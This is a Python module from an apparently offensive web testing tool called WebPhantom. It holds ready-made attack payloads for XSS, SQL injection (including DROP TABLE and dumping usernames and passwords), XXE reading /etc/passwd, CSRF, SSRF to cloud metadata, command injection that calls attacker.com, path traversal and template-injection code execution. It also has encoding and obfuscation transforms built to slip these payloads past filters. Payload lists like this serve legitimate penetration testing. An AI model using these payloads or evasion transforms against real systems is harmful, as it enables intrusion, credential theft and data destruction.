"""
Payload generation module for WebPhantom.
Supports multiple attack categories and transformations.
"""

import os
import json
import base64
import urllib.parse
import random
import string
import logging
import html
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from typing import List, Dict, Any

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Directory to store payload sets
PAYLOAD_DIR = os.path.expanduser("~/.webphantom/payloads")
os.makedirs(PAYLOAD_DIR, exist_ok=True)

# Catégories supportées
PAYLOAD_CATEGORIES = [
    "xss",
    "sqli",
    "xxe",
    "csrf",
    "ssrf",
    "command_injection",
    "path_traversal",
    "ssti",
]

# Default payloads per category
DEFAULT_PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<div onmouseover=\"alert(1)\">Hover me</div>"
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT username,password,3 FROM users --",
        "1'; DROP TABLE users; --",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://internal.service/secret\">]><foo>&xxe;</foo>"
    ],
    "csrf": [
        "<form action=\"http://example.com/api/account\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"><input type=\"submit\" value=\"Click me\"></form>",
        "<img src=\"http://example.com/api/account?email=attacker@evil.com\" style=\"display:none\">",
        "<script>fetch('http://example.com/api/account', {method:'POST',body:JSON.stringify({email:'attacker@evil.com'}),headers:{'Content-Type':'application/json'}});</script>"
    ],
    "ssrf": [
        "http://localhost:8080/admin",
        "http://127.0.0.1:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://internal-service/api/keys",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/xHELO%20localhost"
    ],
    "command_injection": [
        "; ls -la",
        "& dir",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; ping -c 4 attacker.com",
        "| nslookup attacker.com"
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd"
    ],
    "ssti": [
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "${@java.lang.Runtime@getRuntime().exec('id')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    ]
}

class PayloadTransformer:
    """Transformations utilitaires sur les charges utiles (API utilisée par tests.py)."""

    def url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload)

    def html_encode(self, payload: str) -> str:
        return html.escape(payload)

    def base64_encode(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def obfuscate_js(self, payload: str) -> str:
        return js_obfuscate(payload)

    def obfuscate_sql(self, payload: str) -> str:
        return sql_obfuscate(payload)


class PayloadGenerator:
    """Gestionnaire de charges utiles par catégories (API utilisée par tests.py)."""

    def __init__(self, base_dir: str) -> None:
        self.base_dir = base_dir
        os.makedirs(self.base_dir, exist_ok=True)
        for category in PAYLOAD_CATEGORIES:
            os.makedirs(os.path.join(self.base_dir, category), exist_ok=True)

    def _category_file(self, category: str, name: str = "default.json") -> str:
        return os.path.join(self.base_dir, category, name)

    def get_payloads(self, category: str) -> List[str]:
        try:
            default_file = self._category_file(category, "default.json")
            if os.path.exists(default_file):
                with open(default_file, "r") as f:
                    data = json.load(f)
                return data.get("payloads", [])
        except Exception:
            pass
        return DEFAULT_PAYLOADS.get(category, [])

    def create_payload_set(self, category: str, set_name: str, name: str, description: str, payloads: List[str]) -> bool:
        try:
            category_dir = os.path.join(self.base_dir, category)
            os.makedirs(category_dir, exist_ok=True)
            file_path = os.path.join(category_dir, f"{set_name}.json")
            with open(file_path, "w") as f:
                json.dump({
                    "name": name,
                    "description": description,
                    "payloads": payloads,
                }, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Erreur lors de la création de l'ensemble de charges utiles: {str(e)}")
            return False

def generate(payload_type, transform=None, output=None, custom_payloads=None):
    """
    Génère des charges utiles personnalisées.
    
    Args:
        payload_type (str): Type de charge utile (xss, sqli, xxe, etc.)
        transform (str, optional): Transformation à appliquer (url, html, base64, etc.)
        output (str, optional): Chemin du fichier de sortie
        custom_payloads (list, optional): Liste de charges utiles personnalisées
        
    Returns:
        dict: Résultat de la génération
    """
    logger.info(f"Génération de charges utiles de type {payload_type}")
    
    # Vérifier si le type de charge utile est supporté
    if payload_type not in DEFAULT_PAYLOADS and not custom_payloads:
        logger.error(f"Type de charge utile non supporté: {payload_type}")
        return {"success": False, "error": f"Type de charge utile non supporté: {payload_type}"}
    
    # Utiliser les charges utiles personnalisées si fournies, sinon utiliser les charges utiles par défaut
    payloads = custom_payloads if custom_payloads else DEFAULT_PAYLOADS.get(payload_type, [])
    
    # Appliquer la transformation si demandée
    if transform:
        transformed_payloads = []
        for payload in payloads:
            transformed = apply_transform(payload, transform)
            transformed_payloads.append({
                "original": payload,
                "transformed": transformed,
                "transform": transform
            })
        result_payloads = transformed_payloads
    else:
        result_payloads = payloads
    
    # Créer le résultat
    result = {
        "type": payload_type,
        "count": len(result_payloads),
        "payloads": result_payloads
    }
    
    # Sauvegarder dans un fichier si demandé
    if output:
        try:
            with open(output, "w") as f:
                json.dump(result, f, indent=2)
            logger.info(f"Charges utiles sauvegardées dans {output}")
            result["output_file"] = output
        except Exception as e:
            logger.error(f"Erreur lors de la sauvegarde des charges utiles: {str(e)}")
            result["error"] = f"Erreur lors de la sauvegarde: {str(e)}"
    
    # Afficher un résumé
    print(f"[+] {len(result_payloads)} charge(s) utile(s) de type {payload_type} générée(s)")
    if transform:
        print(f"[+] Transformation appliquée: {transform}")
    if output:
        print(f"[+] Résultats sauvegardés dans {output}")
    
    return result

def apply_transform(payload, transform):
    """
    Applique une transformation à une charge utile.
    
    Args:
        payload (str): Charge utile à transformer
        transform (str): Type de transformation (url, html, base64, etc.)
        
    Returns:
        str: Charge utile transformée
    """
    if transform == "url":
        return urllib.parse.quote(payload)
    elif transform == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif transform == "html":
        return html.escape(payload)
    elif transform == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif transform == "hex":
        return payload.encode().hex()
    elif transform == "unicode":
        return "".join([f"\\u{ord(c):04x}" for c in payload])
    elif transform == "js_obfuscate":
        return js_obfuscate(payload)
    elif transform == "sql_obfuscate":
        return sql_obfuscate(payload)
    elif transform == "encrypt_aes":
        return encrypt_aes(payload)
    else:
        logger.warning(f"Transformation non supportée: {transform}")
        return payload

def js_obfuscate(payload):
    """
    Obfuscation JavaScript simple.
    
    Args:
        payload (str): Code JavaScript à obfusquer
        
    Returns:
        str: Code JavaScript obfusqué
    """
    # Convertir en représentation Unicode
    unicode_payload = "".join([f"\\x{ord(c):02x}" for c in payload])
    
    # Créer une fonction d'évaluation
    obfuscated = f"eval('{unicode_payload}')"
    
    return obfuscated

def sql_obfuscate(payload):
    """
    Obfuscation SQL simple.
    
    Args:
        payload (str): Requête SQL à obfusquer
        
    Returns:
        str: Requête SQL obfusquée
    """
    # Remplacer les espaces par des commentaires
    obfuscated = payload.replace(" ", "/**/")
    
    # Utiliser des chaînes concaténées pour les mots-clés courants
    keywords = ["SELECT", "FROM", "WHERE", "UNION", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
    for keyword in keywords:
        if keyword in obfuscated:
            chars = [f"CHAR({ord(c)})" for c in keyword]
            concat = "+".join(chars)
            obfuscated = obfuscated.replace(keyword, f"CONCAT({concat})")
    
    return obfuscated

def encrypt_aes(payload):
    """
    Chiffrement AES simple.
    
    Args:
        payload (str): Texte à chiffrer
        
    Returns:
        str: Texte chiffré en base64
    """
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    key_b64 = base64.b64encode(key).decode('utf-8')
    
    return f"{iv}:{ct}:{key_b64}"

def create_custom_payload_set(name, payload_type, payloads, description=None):
    """
    Crée un ensemble de charges utiles personnalisées.
    
    Args:
        name (str): Nom de l'ensemble
        payload_type (str): Type de charge utile
        payloads (list): Liste des charges utiles
        description (str, optional): Description de l'ensemble
        
    Returns:
        dict: Résultat de la création
    """
    logger.info(f"Création d'un ensemble de charges utiles personnalisées: {name}")
    
    # Créer le fichier de l'ensemble
    filename = f"{name.lower().replace(' ', '_')}.json"
    filepath = os.path.join(PAYLOAD_DIR, filename)
    
    # Créer l'ensemble
    payload_set = {
        "name": name,
        "type": payload_type,
        "description": description or f"Ensemble de charges utiles {payload_type} personnalisées",
        "count": len(payloads),
        "payloads": payloads,
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Sauvegarder l'ensemble
    try:
        with open(filepath, "w") as f:
            json.dump(payload_set, f, indent=2)
        logger.info(f"Ensemble de charges utiles sauvegardé dans {filepath}")
        return {"success": True, "file": filepath, "count": len(payloads)}
    except Exception as e:
        logger.error(f"Erreur lors de la sauvegarde de l'ensemble de charges utiles: {str(e)}")
        return {"success": False, "error": str(e)}

def load_custom_payload_set(name):
    """
    Charge un ensemble de charges utiles personnalisées.
    
    Args:
        name (str): Nom de l'ensemble
        
    Returns:
        dict: Ensemble de charges utiles
    """
    logger.info(f"Chargement de l'ensemble de charges utiles: {name}")
    
    # Construire le chemin du fichier
    filename = f"{name.lower().replace(' ', '_')}.json"
    filepath = os.path.join(PAYLOAD_DIR, filename)
    
    # Vérifier si le fichier existe
    if not os.path.exists(filepath):
        logger.error(f"Ensemble de charges utiles non trouvé: {name}")
        return {"success": False, "error": f"Ensemble non trouvé: {name}"}
    
    # Charger l'ensemble
    try:
        with open(filepath, "r") as f:
            payload_set = json.load(f)
        logger.info(f"Ensemble de charges utiles chargé: {name}")
        return {"success": True, "payload_set": payload_set}
    except Exception as e:
        logger.error(f"Erreur lors du chargement de l'ensemble de charges utiles: {str(e)}")
        return {"success": False, "error": str(e)}

def run(url, options=None):
    """
    Fonction principale pour l'exécution du module de génération de charges utiles.
    
    Args:
        url (str): URL cible (non utilisée pour ce module)
        options (dict, optional): Options supplémentaires
        
    Returns:
        dict: Résultat de l'opération
    """
    if not options:
        options = {}
    
    # Supporte deux modes: simple (type/transform) et avancé (categories/transformations/create_custom)
    payload_type = options.get("type") or options.get("category", "xss")
    transform = options.get("transform", None)
    output = options.get("output", None)
    results_dir = options.get("results_dir")

    categories = options.get("categories")
    transformations = options.get("transformations")
    create_custom_cfg = options.get("create_custom")

    combined_results: Dict[str, Any] = {"generated": []}

    if categories:
        for cat in categories:
            if transformations:
                for t in transformations:
                    logger.info(f"Génération: catégorie={cat}, transformation={t}")
                    partial_output = None
                    if results_dir:
                        partial_output = os.path.join(results_dir, f"{cat}_{t}_payloads.json")
                    res = generate(cat, t, partial_output)
                    combined_results["generated"].append(res)
            else:
                logger.info(f"Génération: catégorie={cat}")
                partial_output = None
                if results_dir:
                    partial_output = os.path.join(results_dir, f"{cat}_payloads.json")
                res = generate(cat, None, partial_output)
                combined_results["generated"].append(res)

    if create_custom_cfg:
        logger.info("Création d'un ensemble de charges utiles personnalisées depuis la configuration")
        create_custom_payload_set(
            name=create_custom_cfg.get("set_name", create_custom_cfg.get("name", "custom_set")),
            payload_type=create_custom_cfg.get("category", payload_type or "xss"),
            payloads=create_custom_cfg.get("payloads", []),
            description=create_custom_cfg.get("description"),
        )

    if not categories and payload_type:
        if not output and results_dir:
            output = os.path.join(results_dir, f"{payload_type}_payloads.json")
        logger.info(f"Génération de charges utiles de type {payload_type}")
        return generate(payload_type, transform, output)

    return combined_results
